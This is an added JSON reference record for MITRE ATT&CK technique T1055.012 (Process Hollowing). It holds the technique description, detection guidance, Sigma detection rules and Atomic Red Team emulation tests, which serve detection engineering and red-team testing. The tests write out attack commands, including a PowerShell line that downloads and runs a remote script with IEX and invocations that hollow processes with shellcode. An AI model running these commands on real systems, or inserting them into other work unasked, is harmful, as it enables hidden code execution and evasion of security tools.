@@ -1,0 +1,214 @@
+{
+    "id": "T1055.012",
+    "name": "Process Hollowing",
+    "description": "Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.\nProcess hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as `CreateProcess`, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as `ZwUnmapViewOfSection` or `NtUnmapViewOfSection`  before being written to, realigned to the injected code, and resumed via `VirtualAllocEx`, `WriteProcessMemory`, `SetThreadContext`, then `ResumeThread` respectively.(Citation: Leitch Hollowing)(Citation: Elastic Process Injection July 2017)\nThis is very similar to [Thread Local Storage](T1055.005) but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process.",
+    "platforms": "Windows",
+    "kill_chain_phases": "Defense Evasion, Privilege Escalation",
+    "data_sources": "Process: Process Modification, Process: OS API Execution, Process: Process Access",
+    "detection": "Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as `CreateRemoteThread`, `SuspendThread`/`SetThreadContext`/`ResumeThread`, and those that can be used to modify memory within another process, such as `VirtualAllocEx`/`WriteProcessMemory`, may be used for this technique.(Citation: Elastic Process Injection July 2017)\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.",
+    "url": "https://attack.mitre.org/techniques/T1055/012",
+    "enrichments": {
+        "attack_rule_map": [],
+        "cycat": {
+            "cycat": {
+                "cycat_related_uuids": [
+                    "5eeec9aa-9d88-4ece-9e6f-9d92884ae404",
+                    "2e4e488a-6164-4811-9ea1-f960c7359c40",
+                    "c4b890e5-8d8c-4496-8c66-c805753817cd",
+                    "b200542e-e877-4395-875b-cf1a44537ca4",
+                    "f35d4a9f-881b-46b7-9d8a-887a40bce133",
+                    "827e941e-4a99-4e2c-a578-bfcec2d40552"
+                ],
+                "lookup_results": [
+                    {
+                        "uuid": "5eeec9aa-9d88-4ece-9e6f-9d92884ae404",
+                        "lookup_data": {
+                            "description": "Dissecting PlugX to Extract Its Crown Jewels",
+                            "link": "https://www.circl.lu/doc/misp/feed-osint/5eeec9aa-9d88-4ece-9e6f-9d92884ae404.json",
+                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
+                            "timestamp": "1663580963",
+                            "uuid": "5eeec9aa-9d88-4ece-9e6f-9d92884ae404",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "2e4e488a-6164-4811-9ea1-f960c7359c40",
+                        "lookup_data": {
+                            "description": "Detects remote thread creation from CACTUSTORCH as described in references.",
+                            "raw": "author: '@SBousseaden (detection), Thomas Patzke (rule)'\ndate: 2019/02/01\ndescription: Detects remote thread creation from CACTUSTORCH as described in references.\ndetection:\n  condition: selection\n  selection:\n    SourceImage|endswith:\n    - \\System32\\cscript.exe\n    - \\System32\\wscript.exe\n    - \\System32\\mshta.exe\n    - \\winword.exe\n    - \\excel.exe\n    StartModule: null\n    TargetImage|contains: \\SysWOW64\\\nfalsepositives:\n- Unknown\nid: 2e4e488a-6164-4811-9ea1-f960c7359c40\nlevel: high\nlogsource:\n  category: create_remote_thread\n  product: windows\nmodified: 2022/12/25\nreferences:\n- https://twitter.com/SBousseaden/status/1090588499517079552\n- https://github.com/mdsecactivebreach/CACTUSTORCH\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1055.012\n- attack.execution\n- attack.t1059.005\n- attack.t1059.007\n- attack.t1218.005\ntitle: CACTUSTORCH Remote Thread Creation\n",
+                            "sigma:id": "2e4e488a-6164-4811-9ea1-f960c7359c40",
+                            "title": "CACTUSTORCH Remote Thread Creation",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "c4b890e5-8d8c-4496-8c66-c805753817cd",
+                        "lookup_data": {
+                            "description": "Detects when a memory process image does not match the disk image, indicative of process hollowing.",
+                            "raw": "author: Christopher Peacock '@securepeacock', SCYTHE '@scythe_io', Sittikorn S\ndate: 2022/01/25\ndescription: Detects when a memory process image does not match the disk image, indicative\n  of process hollowing.\ndetection:\n  condition: selection and not filters\n  filters:\n    Image|contains:\n    - :\\Program Files\\\n    - :\\Program Files (x86)\n    Image|endswith:\n    - \\chrome.exe\n    - \\opera.exe\n    - \\firefox.exe\n    - \\MicrosoftEdge.exe\n    - \\WMIADAP.exe\n  selection:\n    Type: Image is replaced\nfalsepositives:\n- There are no known false positives at this time\nid: c4b890e5-8d8c-4496-8c66-c805753817cd\nlevel: high\nlogsource:\n  category: process_tampering\n  product: windows\nmodified: 2023/01/03\nreferences:\n- https://twitter.com/SecurePeacock/status/1486054048390332423?s=20\n- https://www.bleepingcomputer.com/news/microsoft/microsoft-sysmon-now-detects-malware-process-tampering-attempts/\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1055.012\ntitle: Sysmon Process Hollowing Detection\n",
+                            "sigma:id": "c4b890e5-8d8c-4496-8c66-c805753817cd",
+                            "title": "Sysmon Process Hollowing Detection",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "b200542e-e877-4395-875b-cf1a44537ca4",
+                        "lookup_data": {
+                            "mitre-attack-id": "T1055.012",
+                            "mitre-cti:description": "Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.  \n\nProcess hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as <code>CreateProcess</code>, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as <code>ZwUnmapViewOfSection</code> or <code>NtUnmapViewOfSection</code>  before being written to, realigned to the injected code, and resumed via <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.(Citation: Leitch Hollowing)(Citation: Elastic Process Injection July 2017)\n\nThis is very similar to [Thread Local Storage](https://attack.mitre.org/techniques/T1055/005) but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process. ",
+                            "mitre-cti:name": "Process Hollowing",
+                            "mitre-cti:type": "attack-pattern",
+                            "raw": "{'x_mitre_platforms': ['Windows'], 'x_mitre_domains': ['enterprise-attack'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'attack-pattern--b200542e-e877-4395-875b-cf1a44537ca4', 'type': 'attack-pattern', 'created': '2020-01-14T17:21:54.470Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1055.012', 'url': 'https://attack.mitre.org/techniques/T1055/012'}, {'url': 'http://www.autosectools.com/process-hollowing.pdf', 'description': 'Leitch, J. (n.d.). Process Hollowing. Retrieved November 12, 2014.', 'source_name': 'Leitch Hollowing'}, {'url': 'https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process', 'description': 'Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.', 'source_name': 'Elastic Process Injection July 2017'}, {'source_name': 'Nviso Spoof Command Line 2020', 'url': 'https://blog.nviso.eu/2020/02/04/the-return-of-the-spoof-part-2-command-line-spoofing/', 'description': 'Daman, R. (2020, February 4). The return of the spoof part 2: Command line spoofing. Retrieved November 19, 2021.'}, {'source_name': 'Mandiant Endpoint Evading 2019', 'url': 'https://www.mandiant.com/resources/staying-hidden-on-the-endpoint-evading-detection-with-shellcode', 'description': 'Pena, E., Erikson, C. (2019, October 10). Staying Hidden on the Endpoint: Evading Detection with Shellcode. Retrieved November 29, 2021.'}], 'modified': '2021-11-29T17:22:32.704Z', 'name': 'Process Hollowing', 'description': 'Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.  \\n\\nProcess hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as <code>CreateProcess</code>, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as <code>ZwUnmapViewOfSection</code> or <code>NtUnmapViewOfSection</code>  before being written to, realigned to the injected code, and resumed via <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.(Citation: Leitch Hollowing)(Citation: Elastic Process Injection July 2017)\\n\\nThis is very similar to [Thread Local Storage](https://attack.mitre.org/techniques/T1055/005) but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process. ', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'privilege-escalation'}], 'x_mitre_detection': \"Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code>, <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Elastic Process Injection July 2017)\\n\\nProcessing hollowing commonly involves spawning an otherwise benign victim process. Consider correlating detections of processes created in a suspended state (ex: through API flags or process’ thread metadata) with other malicious activity such as attempts to modify a process' memory, especially by its parent process, or other abnormal process behavior.(Citation: Nviso Spoof Command Line 2020)(Citation: Mandiant Endpoint Evading 2019)\\n\\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.\", 'x_mitre_is_subtechnique': True, 'x_mitre_version': '1.2', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'x_mitre_data_sources': ['Process: Process Access', 'Process: OS API Execution', 'Process: Process Modification'], 'x_mitre_defense_bypassed': ['Application control', 'Anti-virus'], 'x_mitre_permissions_required': ['User']}",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "f35d4a9f-881b-46b7-9d8a-887a40bce133",
+                        "lookup_data": {
+                            "description": "The SideWalk may be as dangerous as the CROSSWALK",
+                            "link": "http://www.botvrij.eu/data/feed-osint/f35d4a9f-881b-46b7-9d8a-887a40bce133.json",
+                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
+                            "timestamp": "1630180802",
+                            "uuid": "f35d4a9f-881b-46b7-9d8a-887a40bce133",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "827e941e-4a99-4e2c-a578-bfcec2d40552",
+                        "lookup_data": {
+                            "description": "Malware analysis report on SparrowDoor malware",
+                            "link": "http://www.botvrij.eu/data/feed-osint/827e941e-4a99-4e2c-a578-bfcec2d40552.json",
+                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
+                            "timestamp": "1650959349",
+                            "uuid": "827e941e-4a99-4e2c-a578-bfcec2d40552",
+                            "_cycat_type": "Item"
+                        }
+                    }
+                ]
+            }
+        },
+        "atomics": [
+            {
+                "attack_technique": "T1055.012",
+                "display_name": "Process Injection: Process Hollowing",
+                "atomic_tests": [
+                    {
+                        "name": "Process Hollowing using PowerShell",
+                        "auto_generated_guid": "562427b4-39ef-4e8c-af88-463a78e70b9c",
+                        "description": "This test uses PowerShell to create a Hollow from a PE on disk with explorer as the parent.\nCredit to FuzzySecurity (https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Start-Hollow.ps1)\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "hollow_binary_path": {
+                                "description": "Path of the binary to hollow (executable that will run inside the sponsor)",
+                                "type": "string",
+                                "default": "C:\\Windows\\System32\\cmd.exe"
+                            },
+                            "parent_process_name": {
+                                "description": "Name of the parent process",
+                                "type": "string",
+                                "default": "explorer"
+                            },
+                            "sponsor_binary_path": {
+                                "description": "Path of the sponsor binary (executable that will host the binary)",
+                                "type": "string",
+                                "default": "C:\\Windows\\System32\\notepad.exe"
+                            },
+                            "spawnto_process_name": {
+                                "description": "Name of the process to spawn",
+                                "type": "string",
+                                "default": "notepad"
+                            }
+                        },
+                        "executor": {
+                            "command": ". \"$PathToAtomicsFolder\\T1055.012\\src\\Start-Hollow.ps1\"\n$ppid=Get-Process #{parent_process_name} | select -expand id\nStart-Hollow -Sponsor \"#{sponsor_binary_path}\" -Hollow \"#{hollow_binary_path}\" -ParentPID $ppid -Verbose\n",
+                            "cleanup_command": "Stop-Process -Name \"#{spawnto_process_name}\" -ErrorAction Ignore\n",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "RunPE via VBA",
+                        "auto_generated_guid": "3ad4a037-1598-4136-837c-4027e4fa319b",
+                        "description": "This module executes notepad.exe from within the WINWORD.EXE process\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "ms_product": {
+                                "description": "Maldoc application Word",
+                                "type": "string",
+                                "default": "Word"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "Microsoft #{ms_product} must be installed\n",
+                                "prereq_command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
+                                "get_prereq_command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1055.012\\src\\T1055.012-macrocode.txt\" -officeProduct \"#{ms_product}\" -sub \"Exploit\"\n",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "Process Hollowing in Go using CreateProcessW WinAPI",
+                        "auto_generated_guid": "c8f98fe1-c89b-4c49-a7e3-d60ee4bc2f5a",
+                        "description": "Creates a process in a suspended state, executes shellcode to spawn calc.exe in a child process, and then resumes the original process.\n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createprocess)\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "hollow_binary_path": {
+                                "description": "Path of the binary to hollow",
+                                "type": "string",
+                                "default": "C:\\Windows\\System32\\werfault.exe"
+                            },
+                            "hollow_process_name": {
+                                "description": "Name of the process to hollow",
+                                "type": "string",
+                                "default": "werfault"
+                            }
+                        },
+                        "executor": {
+                            "name": "powershell",
+                            "elevation_required": false,
+                            "command": "$PathToAtomicsFolder\\T1055.012\\bin\\x64\\CreateProcess.exe -program \"#{hollow_binary_path}\" -debug\n",
+                            "cleanup_command": "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue\nStop-Process -Name \"#{hollow_process_name}\" -ErrorAction SilentlyContinue\n"
+                        }
+                    },
+                    {
+                        "name": "Process Hollowing in Go using CreateProcessW and CreatePipe WinAPIs (T1055.012)",
+                        "auto_generated_guid": "94903cc5-d462-498a-b919-b1e5ab155fee",
+                        "description": "Create a process in a suspended state, execute shellcode to spawn calc.exe in a child process, and then resume the original process.\nThis test uses the CreatePipe function to create an anonymous pipe that parent and child processes can communicate over. This anonymous pipe\nallows for the retrieval of output generated from executed shellcode.\n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createprocesswithpipe)\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "hollow_binary_path": {
+                                "description": "Path of the binary to hollow",
+                                "type": "string",
+                                "default": "C:\\Windows\\System32\\werfault.exe"
+                            },
+                            "hollow_process_name": {
+                                "description": "Name of the process to hollow",
+                                "type": "string",
+                                "default": "werfault"
+                            }
+                        },
+                        "executor": {
+                            "name": "powershell",
+                            "elevation_required": false,
+                            "command": "$PathToAtomicsFolder\\T1055.012\\bin\\x64\\CreateProcessWithPipe.exe -program \"#{hollow_binary_path}\" -debug\n",
+                            "cleanup_command": "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue\nStop-Process -Name \"#{hollow_process_name}\" -ErrorAction SilentlyContinue"
+                        }
+                    }
+                ]
+            }
+        ]
+    },
+    "timestamp": "2025-02-28 11:53:19"
+}
